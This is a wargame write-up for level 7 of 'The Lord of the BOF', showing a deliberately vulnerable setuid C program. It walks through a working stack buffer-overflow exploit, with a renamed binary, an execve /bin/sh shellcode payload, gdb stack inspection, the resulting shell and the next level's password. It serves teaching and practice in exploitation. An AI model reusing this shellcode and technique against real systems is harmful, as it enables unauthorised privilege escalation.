# Level7

# This level's goal
- LEVEL7 (darkelf -> orge) : check argv[0]

***

```
[darkelf@localhost darkelf]$ bash2

[darkelf@localhost darkelf]$ ls -l
total 20
-rwsr-sr-x    1 orge     orge        12700 Mar  1  2010 orge
-rw-r--r--    1 root     root          800 Mar 29  2010 orge.c

[darkelf@localhost darkelf]$ cat orge.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

In the code, there is some changed code that argv[0] should be the length of 77 bytes compare to the previous level.

The argv[0] menas the filename(orge).

So, you need to rename the file name with the length of 77bytes. (you need to think of the 2bytes of "./").

The payload will be same like level6. dummy(44bytes) + RET(4bytes) in argv[1] and NOP + Shell code in argv[2].

```
[darkelf@localhost darkelf]$ ulimit -s unlimited
[darkelf@localhost darkelf]$ rename orge `python -c 'print "A"*75'` orge
[darkelf@localhost darkelf]$ ./`python -c 'print "A"*75+" "+"D"*44+"\xff\xff\xff\xbf"+" "+"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDÿÿÿ¿
Segmentation fault (core dumped)
[darkelf@localhost darkelf]$ gdb -c core -q
Core was generated by `./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA D'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfffffff in ?? ()

(gdb) x/100x $esp
0xbffffb20:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffb30:     0x00000000      0x00000000      0x2e000000      0x4141412f
0xbffffb40:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb50:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb60:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb70:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb80:     0x41414141      0x41414141      0x44444400      0x44444444
0xbffffb90:     0x44444444      0x44444444      0x44444444      0x44444444
0xbffffba0:     0x44444444      0x44444444      0x44444444      0x44444444
0xbffffbb0:     0x44444444      0xffffff44      0x909000bf      0x90909090
0xbffffbc0:     0x90909090      0x90909090      0x90909090      0xc0319090
0xbffffbd0:     0x2f2f6850      0x2f686873      0x896e6962      0x895350e3
0xbffffbe0:     0xb0c289e1      0x0080cd0b      0x00000000      0x00000000

[darkelf@localhost darkelf]$ ./`python -c 'print "A"*75+" "+"D"*44+"\xc0\xfb\xff\xbf"+" "+"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDÀûÿ¿
bash$ my-pass
euid = 507
timewalker
```


